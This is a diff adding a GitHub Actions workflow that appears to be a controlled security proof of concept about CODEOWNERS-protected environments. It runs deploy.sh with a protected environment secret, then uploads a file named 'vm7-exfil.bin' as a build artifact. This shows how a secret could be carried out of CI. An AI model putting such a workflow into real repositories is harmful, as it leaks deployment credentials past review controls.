@@ -1,0 +1,28 @@
+name: VM7 CODEOWNERS BOM Environment Consumer
+
+on:
+  push:
+    branches:
+      - "vm7-codeowners-diff-base-261017a"
+
+permissions:
+  contents: read
+
+jobs:
+  consume:
+    runs-on: ubuntu-latest
+    environment: vm7-codeowners-bom-env
+    steps:
+      - name: Check out protected branch
+        uses: actions/checkout@v4
+      - name: Run protected deployment hook
+        env:
+          VM7_PROTECTED_SECRET: ${{ secrets.VM7_CODEOWNERS_BOM_SECRET }}
+        run: bash deploy.sh
+      - name: Preserve controlled confidentiality proof
+        uses: actions/upload-artifact@v4
+        with:
+          name: vm7-codeowners-bom-secret
+          path: vm7-exfil.bin
+          if-no-files-found: ignore
+          retention-days: 1
